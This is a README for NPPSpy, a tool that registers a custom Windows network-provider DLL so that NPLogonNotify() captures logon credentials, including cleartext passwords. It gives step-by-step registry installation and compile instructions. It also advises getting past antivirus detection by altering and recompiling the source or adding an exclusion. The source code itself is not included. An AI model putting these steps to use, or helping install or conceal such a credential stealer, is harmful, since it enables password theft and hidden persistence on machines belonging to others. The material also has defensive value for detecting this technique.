Simple (but fully working) code for `NPLogonNotify()`. 
The function obtains logon data, including cleartext password.

**The DLL is detected by AV engines as a "potentially unwanted software" for obvious reason.**<br>
You have been warned. And if you want to run it anyway, you can re-compile it (instructions below) after introducing some changes in the source code, or just add an AV exclusion.

#### Installation:
1. Copy NPPSpy.dll to the System32 folder
1. Add `"NPPSpy"` at the end of the `"ProviderOrder"` in `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`
1. Create `HKLM\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider` and set following values:
   - `"Class" = [REG_DWORD]2`
   - `"ProviderPath" = [REG_EXPAND_SZ]"%SystemRoot%\System32\NPPSPY.dll"`
   - `"Name" = [REG_SZ]"NPPSpy"`

OR

Use the ConfigureRegistrySettings.ps1 script (by @LadhaAleem)

Re-logon is required, reboot is not required.

#### Build it at home
1. From the Start Menu run Visual Studio 2019 -> x64 Native Tools Command Prompt for VS 2019
1. Browse to the folder with your NPPSpy.c
1. Run cl.exe /LD NPPSpy.c

#### Documentation:
The idea is somewhat documented at https://docs.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify
